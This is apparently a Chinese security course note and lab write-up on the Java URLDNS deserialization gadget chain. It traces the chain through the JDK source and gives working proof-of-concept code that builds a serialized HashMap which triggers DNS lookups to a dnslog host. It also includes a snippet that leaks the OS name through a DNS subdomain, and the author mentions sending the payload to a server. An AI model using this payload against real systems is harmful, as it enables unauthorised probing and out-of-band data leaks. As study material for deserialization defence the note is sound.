[TOC]



# ==URLDNS反序列化链==

## 教材内容

#### 一、什么是URLDNS链

在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value。所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中。而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求 ，所以就满足了DNS外带这样的一个漏洞

要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap中；然后设置这个 URL 对象的 hashCode 为初始值 -1（URL类中hashCode属性的值默认就为-1） ，这样反序列化时将会重新计算其 hashCode ，才能触发到后⾯的DNS请求（getHostAddress方法），否则不会调⽤ URL->hashCode()。

#### 二、测试代码

```java
package com.woniuxy.poc;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
public class UrlDns {    
    public static void main(String[] args) throws MalformedURLException {        
        // InetAddress address = InetAddress.getByName("123456.ns.matrika.cn");        
        // System.out.println(address.getHostAddress());        
        HashMap map = new HashMap();        
        URL url = new URL("http://123456.ns.matrika.cn");        
        map.put(url,"woniu");        
        // 解析DNS发生在此处（URLStreamHandler类的hashCode方法）        
        System.out.println("代码运行结束.");    
    }
}
```

运行代码时，可以发现触发了DNS解析，在ns.matrika.cn的解析日志中可以获取以下信息：

```
14:53:51.389613 IP 119.4.90.222.14495 > 172.23.107.160.domain: 49258% [1au] A? 123456.ns.matrika.cn. (49)14:53:51.838200 IP 221.10.58.42.58394 > 172.23.107.160.domain: 19547% [1au] A? 123456.ns.matrika.cn. (49)14:53:52.083576 IP 119.4.90.222.63261 > 172.23.107.160.domain: 5407% [1au] A? 123456.ns.matrika.cn. (49)14:53:52.127202 IP 119.4.90.242.11016 > 172.23.107.160.domain: 43123% [1au] A? 123456.ns.matrika.cn. (49)14:53:52.214846 IP 221.10.58.42.62913 > 172.23.107.160.domain: 9798% [1au] A? 123456.ns.matrika.cn. (49)14:53:52.503441 IP 119.4.90.242.34931 > 172.23.107.160.domain: 38998% [1au] A? 123456.ns.matrika.cn. (49)
```

#### 三、关联源代码

如果是JDK的源代码，则在JDK安装包中的src.zip文件，如果没有，则可以官方下载。

![image-20231201143333833](https://gitee.com/ymq_typroa/typroa/raw/main/202312011433934.png)

#### 四、跟踪URL类的hashCode属性和方法

通过上述11行源代码，map.put方法，跟踪到生成hashCode的原始方法（在Object中进行定义，由于是URL实例，所以从URL类中找实现方法）。

```java
// URL类225行：初始化hashCode属性
private int hashCode = -1;
// URL类881行，实现hashCode方法
public synchronized int hashCode() {    
    if (hashCode != -1)        
        return hashCode;    
    hashCode = handler.hashCode(this);    
    return hashCode;
}
// 跟踪handler.hashCode(this)，获取原始生成HashCode的方法（350行）
protected int hashCode(URL u) {    
    int h = 0;    
    // Generate the protocol part.    
    String protocol = u.getProtocol();    
    if (protocol != null)        
        h += protocol.hashCode();    
    // Generate the host part.    
    InetAddress addr = getHostAddress(u);        
    // 实现DNS解析的关键所在    
    if (addr != null) {        
        h += addr.hashCode();    
    } else {        
        String host = u.getHost();        
        if (host != null)            
            h += host.toLowerCase().hashCode();    
    }
    …………………………………… 后续代码略
```

#### 五、从HashMap开始构造URLDNS链

由于DNS解析是从HashMap的put方法开始，确认HashMap是否可以被序列化，发现HashMap实现了Serializable接口，可以序列化。

```
public class HashMap<K,V> extends AbstractMap<K,V>    implements Map<K,V>, Cloneable, Serializable {
```

则尝试对HashMap进行序列化，代码如下：

```java
package com.woniuxy.poc;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Set;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
public class UrlDns {    
    public static void main(String[] args) throws Exception {        
        HashMap<URL,String> map = new HashMap<URL,String>();        
        Class clazz = Class.forName("java.net.URL");        
        Constructor c = clazz.getDeclaredConstructor(String.class);        
        URL url = (URL)c.newInstance("http://123456.ns.matrika.cn");        
        Field f = clazz.getDeclaredField("hashCode");        
        f.setAccessible(true);        
        f.set(url, 100);        
        // 修改为100，不会进行DNS解析        
        map.put(url,"woniu");        
        f.set(url, -1);        
        // 修改为-1，可以在反序列化时引发DNS解析        
        try {            
            FileOutputStream fileOutputStream = new FileOutputStream("./data/urldns.ser");            
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);            
            outputStream.writeObject(map);            
            outputStream.close();            
            fileOutputStream.close();        
        } catch (Exception e) {            
            e.printStackTrace();        
        }        
        System.out.println("代码运行结束.");    
    }
}
```

最后确认在data目录下，生成了urldns.ser序列化文件。

#### 六、对urldns.ser进行反序列化

由于在HashMap中，HashMap重写了readObject方法，而该方法中又存在一行代码可以调用hash()函数，所以可以作为URLDNS反序列化链的起点，完成DNS带外。

```java
 private void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException {    
     …………………… 代码略 ……………………    
         for (int i = 0; i < mappings; i++) {        
             @SuppressWarnings("unchecked")        
             K key = (K) s.readObject();        
             @SuppressWarnings("unchecked")        
             V value = (V) s.readObject();        
             putVal(hash(key), key, value, false, false);    
             // 此处为反序列化起点    
         }
 }
```

反序列化代码如下：

```java
FileInputStream fileInputStream = new FileInputStream("./data/urldns.ser");
ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
HashMap<URL,String> map = (HashMap<URL,String>)inputStream.readObject();
inputStream.close();
fileInputStream.close();
```

此时，如果序列化数据工作正常，则将进行DNS解析。整个反序列化过程中，由于HashMap重写了readObject，所以会自动运行，运行过程中又会调用map.put方法，进而触发URL类中hashCode()方法的运行，进而实现DNS解析。

> https://zhuanlan.zhihu.com/p/598007086

## 实验内容

### 一、如何使用java进行dns带外

- **第一种方法**：使用 InetAddress

  - ```java
    public class urlDNS {
        public static void main(String[] args) throws Exception {
            // 如何使用DNS外带,要么自己搭建 dnslog.cn 要么去浏览器直接访问在线的dnslog.cn
            String osname = System.getProperty("os.name");
            osname = osname.replace(" ","-");
            InetAddress address = InetAddress.getByName(osname + ".pme7s8.dnslog.cn");
    //        Inet4Address address = (Inet4Address) Inet4Address.getByName("woniuxy.com");
            System.out.println(address);
        }
    }
    ```

- **第二种方法**：使用 使用 hashmap 和 URL 对象，并将URL对象作为key，put进hashmap。这种方式省略了代码审计的过程，相当于直接由起点（readObject）开始，终点（getHostAddress）结束了

  - ```java
     public class urlDNS {
        public static void main(String[] args) throws Exception {
            // 第二种dns带外的方式
            Map<URL, String> map = new HashMap<>();
            URL url = new URL("http://ymqyyds.pme7s8.dnslog.cn");
            map.put(url,"ymqyyds");
            System.out.println("代码运行结束");
        }
    }
    ```

    ![image-20250114231303763](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114231303763.png)

    如果我们单单只有 

    ```java
    Map<URL, String> map = new HashMap<>();
    URL url = new URL("http://ymqyyds.pme7s8.dnslog.cn");
    ```

    这两句代码的话，是无法进行DNS解析的

    ![image-20250114231043628](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114231043628.png)

    所以我们得到的结论就是，运行 `map.put(url,"ymqyyds");` 这句代码会进行 dns 解析

### 二、对以上代码进行调试

![image-20250114231842784](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114231842784.png)

- **第一步**：进入 `map.put(url,"ymqyyds");` 方法

  ![image-20250114232357418](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114232357418.png)

  进来之后发现函数内先在调用 `putval` 方法

  ![image-20250114232514762](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114232514762.png)

  这个方法太长，先跳过

  然后 putval 函数内部又在调用 hash() 这个方法

- **第二步**：进入 hash() 方法

  ![image-20250114232721776](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114232721776.png)

  hash() 方法又在调用 hashCode() 方法

  我们看 该方法旁边显示了一个值 `key` 然而这个 key 的值不正是我们 URL 实例化对象的值吗，所以此时此刻，该方法我们传入的 Object 类型 就是 URL 类型

- **第三步**：进入 hashCOde() 方法

  ![image-20250114233159448](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114233159448.png)

  此时，我们便进入了 URL 这个类的 hashCode() 方法

  我们观察该方法发现，如果 `hashCode != -1` 那么就直接返回这个 hashCode 。但是问题来了，这个 hashCode 是什么，经过寻找，发现 hashCode 就职 URL 这个类的一个属性，并且它的值默认为 -1

  ![image-20250114233539441](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114233539441.png)

  否则，就让 hashCode = handler 这个对象的 hashCode() 这个方法返回的值

- **第四步**：按行往下走一步，并进入 handler.hashCode() 方法

  ![image-20250114234302678](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114234302678.png)

  我们发现了一个熟悉的东西 

  ```java
  // Generate the host part.
  InetAddress addr = getHostAddress(u);
  ```

  这不正是我们执行 dns 解析的第一种方法嘛，而正是因为这句代码导致了 dns 的解析执行，看注释 `Generate the host part` 意思也正是 从域名解析成 host 主机地址

  ![image-20250114234850954](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114234850954.png)

  我们进入该方法并指执行看看效果

  ![image-20250114235332883](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114235332883.png)

  该方法的 `getByName(host)` 就是域名解析的关键。

  ![image-20250114235151329](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114235151329.png)

  ![image-20250114235255260](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114235255260.png)

  其中 ，起了关键作用的就是 `u.hostAddress = InetAddress.getByName(host);` 这句代码，这正是我们最开始做域名解析的第一种方法。所以这句代码就是我们的终点

- **第五步**：终点有了，寻找起点

  - 记得我们之前说的，java 找起点，一般看 类对象是否有重写 readObject() 这个方法。所以我们在这里就是要去看 HashMap 这个类是否有重写 readObject() 方法

  - **第一步**：看 HashMap 这个类是否可以被序列化

    ![image-20250115000124824](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115000124824.png)

    有这个关键字，说明是可以的

  - 第二步：寻找重写的 readObject() 方法，还真有。

    ![image-20250115000412857](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115000412857.png)

  - **第三步**：找到重写的readObject方法之后，去看该方法重写的代码是否有自动调用`map.put(url,"ymqyyds");`的方法。为神马要找自动调用这个方法的地方呢，因为自动调用了这个方法，才能一直像刚刚审计的过程一样，最终调用到 getHostAddress() 方法中的 getByName(host) 方法，从而进行域名解析

    - 结果是，map.put() 方法没找到，但是！！！找到了 putVal() 方法，而 putVal() 方法正是 map.put() 这个方法所使用的方法

      ![image-20250114232357418](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250114232357418.png)

### 三、对调用链进行POC构造

在构造POC的过程中，需要注意的是，**我们需要将URL类实例的hashCode属性值确保一直为 -1**，我们一旦实例化URL对象之后，编译时会为我们自动生成一个hashCode，其值肯定不是 -1，那么如下图所示的代码，就无法按照我们的调用链进行代码的执行了。

![image-20250115001423073](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115001423073.png)

而需要改值，并且改的还是我们反序列化的对象的值，那么我们就只能使用类反射机制进行设置了

### （1）精心构造序列化值

```java
//对目标精心构造并序列化
public void Serial() throws Exception {
    Map<URL, String> map = new HashMap<>();
    URL url = new URL("http://ymqyydsymqyydsymqyyds.pme7s8.dnslog.cn");

    // 必须执行 map.put 才能把 url当作 key 插进hash表
    map.put(url,"ymqyydsymqyydsymqyyds");  // 但是，一旦执行了改代码，url的hashCode属性也就变得不再是 -1 了
    // 所以在下面的代码中，使用类反射机制设置 url.hashCode = -1

    Class clazz = Class.forName("java.net.URL");
    Field field = clazz.getDeclaredField("hashCode");
    field.setAccessible(true);
    field.set(url,-1);

    // 设置好了构造的 hashcode 此时将构造好的类实例进行序列化
    FileOutputStream fileOutputStream = new FileOutputStream("./data/urldns.ser");  //设置文件输出流对象
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(map);  //因为是map在调用 put 方法，我们最终要序列化的目标就是整个map，因为 url 对象是插在map的hash表中的
}
```

![image-20250115003220471](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115003220471.png)

将精心构造的序列化payload上传至vps，当服务器接收到该序列化值的时候要对改值进行反序列化，此时此刻，他便受到了我们的攻击

### （2）尝试对序列化值进行反序列化

```java
//对构造好的序列化值进行反序列化
public void unserial() throws Exception {
    FileInputStream fileInputStream = new FileInputStream("./data/urldns.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
    System.out.println(objectInputStream.readObject().getClass());
}
```

我们看看执行结果

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115003929935.png" alt="image-20250115003929935" style="zoom:150%;" />

### （3）对反序列化代码进行调试来确保POC构造正确

- 直接在终点 HashMap 类的readObject方法中设置一个断点，然后开启 unserial方法的调试

  ![image-20250115004921431](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115004921431.png)

  此时此刻，便可直接调试运行到该处

  ![image-20250115005118323](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115005118323.png)

  继续，直接进入 putVal 中的 hash 方法

  ![image-20250115005225784](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115005225784.png)

  继续，直接进入 URL 类中的 hashCode 方法

  ![image-20250115005304794](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115005304794.png)

  继续，进入handler.hashCode(this) 方法

  ![image-20250115005404791](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115005404791.png)

  继续，进入，getHostAddress 方法中的 getByName 方法，此时，域名开始解析

  ![image-20250115005454139](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115005454139.png)

  ![image-20250115005519159](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250115005519159.png)

  ok，反序列化校验完成
